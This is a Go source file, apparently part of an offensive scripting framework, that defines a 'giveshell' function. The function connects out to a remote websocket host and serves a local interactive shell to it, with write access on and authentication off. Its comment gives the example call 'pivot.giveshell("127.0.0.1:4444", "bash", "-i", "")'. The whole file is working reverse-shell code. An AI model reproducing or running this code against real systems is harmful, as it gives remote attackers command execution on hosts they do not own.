package pivot

import (
	"context"
	"fmt"
	"log"
	"os"
	"os/signal"
	"strings"
	"syscall"

	"github.com/kcarretto/paragon/pkg/script"

	"github.com/kost/tty2web/backend/localcommand"
	"github.com/kost/tty2web/server"
	"github.com/kost/tty2web/utils"
)

var debug bool = true
var timeoutMS int = 2000
var parallelism int = 1000
var portSelection string

var hideUnavailableHosts bool
var versionRequested bool

var uuid = "30064771073"

func giveshell(parser script.ArgParser) (script.Retval, error) {
	websocket_host, err := parser.GetString(0)
	if err != nil {
		return nil, err
	}
	shell_cmd, err := parser.GetString(1)
	if err != nil {
		return nil, err
	}
	websocket_path, err := parser.GetString(2)
	if err != nil {
		websocket_path = "/cmd"
		// return nil, err
	}
	websocket_scheme, err := parser.GetString(3)
	if err != nil {
		websocket_scheme = "ws"
		// return nil, err
	}

	retVal, retErr := Giveshell(websocket_host, shell_cmd, websocket_path, websocket_scheme)
	return script.WithError(retVal, retErr), nil
}

//pivot.giveshell("127.0.0.1:4444", "bash", "-i", "")
func Giveshell(websocket_host string, shell_cmd string, shell_args string, websocket_scheme string) (string, error) {
	appOptions := &server.Options{}
	if err := utils.ApplyDefaultValues(appOptions); err != nil {
		log.Printf("Error applying default value: %v", err)
		exit(err, 1)
	}
	backendOptions := &localcommand.Options{}
	if err := utils.ApplyDefaultValues(backendOptions); err != nil {
		log.Printf("Error applying backend default value: %v", err)
		exit(err, 1)
	}

	appOptions.EnableBasicAuth = false     //c.IsSet("credential")
	appOptions.EnableTLSClientAuth = false //c.IsSet("tls-ca-crt")
	appOptions.PermitWrite = true
	appOptions.Connect = websocket_host

	err := appOptions.Validate()
	if err != nil {
		log.Printf("Error validating options: %v", err)
		return exit(err, 6)
	}

	factory, err := localcommand.NewFactory(shell_cmd, strings.Split(shell_args, " "), backendOptions)
	if err != nil {
		log.Printf("Error creating local command: %v", err)
		return exit(err, 3)
	}

	hostname, _ := os.Hostname()
	appOptions.TitleVariables = map[string]interface{}{
		"command":  shell_cmd,
		"argv":     strings.Split(shell_args, " "),
		"hostname": hostname,
	}

	srv, err := server.New(factory, appOptions)
	if err != nil {
		log.Printf("Error creating new server: %v", err)
		return exit(err, 5)
	}

	ctx, cancel := context.WithCancel(context.Background())
	gCtx, gCancel := context.WithCancel(context.Background())
	errs := make(chan error, 1)

	go func() {
		errs <- srv.Run(ctx, server.WithGracefullContext(gCtx))
	}()
	err = waitSignals(errs, cancel, gCancel)

	if err != nil && err != context.Canceled {
		fmt.Printf("Error: %s\n", err)
		return exit(err, 8)
	}
	return exit(nil, 0)
}

func exit(err error, code int) (string, error) {
	if err != nil {
		fmt.Println(err)
	}
	return string(code), err
	// os.Exit(code)
}

func wait4Signals() {
	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt)
	select {
	case sig := <-c:
		fmt.Printf("Got %s signal. Aborting...\n", sig)
		// os.Exit(1)
	}
}

func waitSignals(errs chan error, cancel context.CancelFunc, gracefullCancel context.CancelFunc) error {
	sigChan := make(chan os.Signal, 1)
	signal.Notify(
		sigChan,
		syscall.SIGINT,
		syscall.SIGTERM,
	)

	select {
	case err := <-errs:
		return err

	case s := <-sigChan:
		switch s {
		case syscall.SIGINT:
			gracefullCancel()
			fmt.Println("C-C to force close")
			select {
			case err := <-errs:
				return err
			case <-sigChan:
				fmt.Println("Force closing...")
				cancel()
				return <-errs
			}
		default:
			cancel()
			return <-errs
		}
	}
}
